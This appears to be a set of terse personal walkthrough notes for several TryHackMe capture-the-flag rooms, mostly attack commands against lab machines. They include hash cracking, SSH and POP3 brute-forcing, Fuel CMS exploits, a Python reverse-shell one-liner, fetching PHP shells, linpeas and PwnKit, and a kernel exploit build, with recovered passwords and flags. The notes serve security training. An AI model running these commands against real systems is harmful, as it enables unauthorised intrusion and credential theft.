# OhSINT
tryhackme ohsint walkthrough
## Download the picture.
## Getting information using the downloaded picture.
Download exiftool from
https://exiftool.org/

exiftool WindowsXP_1551719014755.jpg
OWoodflint
wigle.net
B4:5D:50:AA:86:41
cat
London
UnileverWiFi
OWoodflint@gmail.com
Github
New York
pennYDr0pper.!


# Crack the hash walkthrough
type check
https://hashes.com/en/tools/hash_identifier

value check on
https://crackstation.net/

john --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --format=bcrypt hash4.txt

# download hashcat format
./hashcat -m 3200 -D 2 hash4.txt example.dict

bleh

https://hashcat.net/hashcat/

john --wordlist=rockyou.txt --format=sha512crypt hash8.txt
hashcat -m 1800 -D 2 hash8.txt example.dict
./hashcat -m 1800 -a 3 hash8.txt ./masks/rockyou-1-60.hcmask

hashcat -m 160 -D 2 hash9.txt example.dict
./hashcat -m 160 -a 3 hash9.txt ./masks/8char-1l-1u-1d-1s-compliant.hcmask
./hashcat -m 160 -a 3 hash9.txt ./masks/rockyou-1-60.hcmask

# Anonforce
tryhackme Anonforce walkthrough
nmap -sV -vv Shown in 0min 57s
ftp anonymous@10.10.128.148
cat user.txt
606083fd33beb1284fc51f411a706af8

cd /notread
gpg2john private.asc > privatejohn
john privatejohn
xbox360
gpg --import private.asc
gpg --decrypt backup.pgp

echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root_hash.txt
john root_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hikari
ssh root@10.10.128.148
cat /root/root.txt
f706456440c7af4187810c31c6cebdce

# Ignite
tryhackme Ignite walkthrough
qiita.com
nmap -sV -vv 10.10.161.86
gobuster dir -u http://10.10.161.86 -w /usr/share/wordlists/dirb/common.txt

http://10.10.161.86/fuel
admin admin
searchsploit fuelCMS
47138.py
python3 fuel_exploit.py -u http://10.10.161.86
whoami
cat fuel/application/config/database.php
nc -lnvp 4444

python /usr/share/exploitdb/exploits/php/webapps/50477.py -u http://10.10.161.86
cat /home/www-data/flag.txt
system6470e394cbf6dab6a91682cc8585059b

python -m http.server 8000
/var/www/html/php-reverse-shell.php
wget http://10.10.161.86:8000/php-reverse-shell.php
nc -lvnp 1234
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l
find / -user root -perm -4000 2>&1 | grep -v -e "Permission denied" -e "No such file or directory"
python -m http.server 8000
wget http://10.10.161.86:8000/linpeas.sh
chmod +x linpeas.sh
 /bin/sh linpeas.sh

git clone https://github.com/ly4k/PwnKit.git
python -m http.server 8000
wget -r http://10.6.55.144:8000/PwnKit/
chmod +x ./PwnKit
./PwnKit '/bin/sh -i'

 cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d

# Basic Pentesting
tryhackme Basic Pentesting walkthrough
## Deploy the machine
10.10.163.180
Download openvpn configuration file to connect with VPN to machines in TryHackMe.
https://tryhackme.com/access?o=vpn
openvpn 1.ovpn
ping 10.10.163.180 -c 4
nmap -A -T4 -p- 10.10.163.180
gobuster dir -u http://10.10.163.180/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
development
enum4linux 10.10.163.180
jan
smbclient //10.10.163.180/Anonymous
get staff.txt
cat staff.txt
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.163.180 ssh
armando
ssh
ssh jan@10.10.163.180
cd /home && ls
kay

find / -name "id_rsa"
cd /home/kay && ls
ls -al
cd /home/kay/.ssh && ls -al
cat id_rsa
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
beeswax
ssh -i id_rsa kay@10.10.163.180

cat pass.bak
sudo su
cd /root && ls
cat flag.txt

# Fowsniff CTF
tryhackme Fowsniff CTF walkthrough
10.10.94.201
nmap -Pn -A 10.10.94.201
gobuster dir -u http://10.10.94.201 -w /usr/share/dirb/wordlists/common.txt

googled “fowsniff corp” and found a Pastebin link that contained username and passwords.
https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX

https://crackstation.net/
8a28a94a588a95b80163709ab4313aa4	md5	mailcall
ae1644dac5b77c0cf51e0d26ad6d7e56	md5	bilbo101
1dc352435fecca338acfd4be10984009	md5	apples01
19f5af754c31f1e2651edde9250d69bb	md5	skyler22
90dc16d47114aa13671c697fd506cf26	md5	scoobydoo2
a92b8a29ef1183192e3d35187e0cfabd	Unknown	Not found.
0e9588cb62f4b6f27e33d449e2ba0b3b	md5	carp4ever
4d6e42f56e127803285a0a7649b5ab11	md5	orlando12
f7fd98d380735e859f8b2ffbbede5a7e	md5	07011972

msfconsole
search pop3
Use 0
show options
set rhosts 10.10.94.201
set user_file userfow.txt
set pass_file passfow.txt
set verbose false
run

hydra -L userfow.txt -P passfow.txt pop3://10.10.94.201
hydra pop3://10.10.94.201 -L userfow.txt -P passfow.txt

nc 10.10.94.201 110
USER seina
PASS scoobydoo2
LIST
Command Used: RETR 1
SSH Temporary Password: S1ck3nBluff+secureshell
ssh baksteen@10.10.94.201
uname –a
id
find / -group users -type f 2>/dev/null
cd /opt/cube
cat cube.sh

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

nc -lvp 1234
id
cd /root
cat flag.txt

find 116-generic on ExploitDB

cd /var/www/html/

wget https://www.exploit-db.com/download/44298

mv 44298 44298.c

gcc 44298.c -o exploit

/etc/init.d/apache2 start

ifconfig tun0

cd /tmp/

wget testerpc.test/exploit

chmod +x exploit

./exploit
id
cd /root && ls
cat flag.txt

# c4ptur3-th3-fl4g
tryhackme c4ptur3-th3-fl4g walkthrough

c4n y0u c4p7u23 7h3 f149?
can you capture the flag?

Go to https://cyberchef.org/
https://gchq.github.io/CyberChef/

01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001
lets try some binary out!

MJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM======
base32 is super common in CTF's

RWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg==
Each Base64 digit represents exactly 6 bits of data.

68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f
hexadecimal or base16?

Ebgngr zr 13 cynprf!
Rotate me 13 places!

*@F DA:? >6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:>6DX
You spin me right round baby right round (47 times)

- . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -.

. -. -.-. --- -.. .. -. --.
TELECOMMUNICATIO  ENCODING

85 110 112 97 99 107 32 116 104 105 115 32 66 67 68
Unpack this BCD

Base64 -> Morse code -> Binary ->ROT47 -> Decimal
Let's make this a bit trickier...

Super Secret Message

steghide extract -sf stegosteg_1559008553457.jpg
cat steganopayload2248.txt
SpaghettiSteg

hexdump -C meme_1559010886025.jpg
strings meme_1559010886025.jpg
cat meme_1559010886025.jpg
hackerchat.png
AHH_YOU_FOUND_ME

#$ Investigating Windows
tryhackme Investigating Windows walkthrough
10.10.228.218

What’s the version and year of the Windows machine?
Settings > system > about
windows server 2016

Which user logged in last?
Administrator

When did John log onto the system last?
03/02/2019 5:48:32 PM

What IP does the system connect to when it first starts?
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
10.34.2.3

What two accounts had administrative privileges (other than the Administrator user)?
net localgroup Administrators
Guest Jenny

Whats the name of the scheduled task that is malicous.
Task Scheduler
Clean file system

What file was the task trying to run daily?
nc.ps1

What port did this file listen locally for?
1348

When did Jenny last logon?
net user Jenny
Never

At what date did the compromise take place?
03/02/2019

At what time did Windows first assign special privileges to a new logon?
03/02/2019 4:04:49 PM

What tool was used to get Windows passwords?
Get-FileHash .\mim.exe
Mimikatz

What was the attackers external control and command servers IP?
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
76.32.97.132

What was the extension name of the shell uploaded via the servers website?
c:\inetpub\wwwroot
.jsp

What was the last port the attacker opened?
netsh firewall show state
In event viewer, navigate to
Applications and Services Logs\Microsoft\Windows\Windows Firewall with Advanced Security\Firewall
1337

Check for DNS poisoning, what site was targeted?
type C:\WINDOWS\System32\drivers\etc\hosts
google.com

# Dav
tryhackme Dav walkthrough

nmap -Pn -sC -A -T4 -sV 10.10.188.199 -oN nmap_result
nmap -A -v 10.10.188.199

gobuster dir -u 10.10.188.199 -w /usr/share/dirb/wordlists/common.txt

10.10.188.199/webdav

webdav default credentials
https://thisiszzzombie.blogspot.com/2011/12/webdav-xampp-1.html
user: wampp, pass: xampp and I was able to log in.

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
cadaver http://10.10.188.199/webdav
put /home/kali/Dav/php-reverse-shell.php
nc -lvnp 1234
http://10.10.188.199/webdav/php-reverse-shell.php
whoami
cat /home/merlin/user.txt
449b40fe93f78a938523b7e4dcd66d2a

sudo -l

sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
